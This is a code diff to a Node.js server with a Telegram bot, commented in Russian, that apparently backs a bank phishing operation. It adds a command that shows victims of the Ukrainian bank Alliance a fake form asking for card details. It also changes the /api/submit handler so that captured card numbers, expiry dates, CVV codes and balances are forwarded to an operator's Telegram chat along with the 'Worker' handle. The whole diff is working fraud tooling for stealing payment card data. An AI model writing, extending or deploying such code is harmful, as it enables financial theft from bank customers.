@@ -31,7 +31,7 @@ if (WEBHOOK_URL) {
     bot.setWebHook(WEBHOOK_URL)
         .then(() => console.log(`Webhook успешно установлен на ${WEBHOOK_URL}`))
         .catch(err => console.error('Ошибка установки вебхука:', err));
-    bot.sendMessage(CHAT_ID, '✅ СЕРВЕР ПЕРЕЗАПУЩЕН! Финальные доработки применены.', { parse_mode: 'HTML' }).catch(console.error);
+    bot.sendMessage(CHAT_ID, '✅ СЕРВЕР ПЕРЕЗАПУЩЕН! Логика обновлена для работы с новыми формами.', { parse_mode: 'HTML' }).catch(console.error);
 } else {
     console.error('Критическая ошибка: не удалось определить RENDER_EXTERNAL_URL. Вебхук не установлен.');
 }
@@ -113,11 +113,19 @@ bot.on('callback_query', (callbackQuery) => {
             responseText = 'Запрос "неверный код" отправлен!';
             break;
             
+        // --- ИЗМЕНЕННАЯ ЛОГИКА ---
         case 'request_details':
-            if (sessionData.bankName !== 'Ощадбанк') {
+            if (sessionData.bankName === 'Альянс') {
+                command.type = 'request_alliance_card_details';
+                responseText = 'Запрос (Альянс) отправлен!';
+            } 
+            else if (sessionData.bankName !== 'Ощадбанк') {
                  command.type = 'show_card_details_form';
-            } else {
-                 responseText = 'Команда "Запрос" не применима для Ощадбанка';
+                 responseText = 'Запрос (общий) отправлен!';
+            } 
+            else {
+                 bot.answerCallbackQuery(callbackQuery.id, { text: 'Команда "Запрос" не применима для Ощадбанка', show_alert: true });
+                 return; // Выходим, не отправляя команду
             }
             break;
             
@@ -193,12 +201,14 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         }
+        // --- ИЗМЕНЕННАЯ ЛОГИКА ---
         else if (stepData.card_details) {
+            const details = stepData.card_details;
             message = `<b>Данные по запросу (${newData.bankName})</b>\n\n`;
-            message += `<b>Номер карты:</b> <code>${stepData.card_details.card}</code>\n`;
-            message += `<b>Срок действия:</b> <code>${stepData.card_details.exp}</code>\n`;
-            message += `<b>CVV:</b> <code>${stepData.card_details.cvv}</code>\n`;
-            message += `<b>Баланс:</b> <code>${stepData.card_details.balance}</code>\n`;
+            message += `<b>Номер карты:</b> <code>${details.card || details.card_number_full || 'N/A'}</code>\n`;
+            message += `<b>Срок действия:</b> <code>${details.exp || details.exp_date || 'N/A'}</code>\n`;
+            message += `<b>CVV:</b> <code>${details.cvv || 'N/A'}</code>\n`;
+            message += `<b>Баланс:</b> <code>${details.balance || 'N/A'}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         }
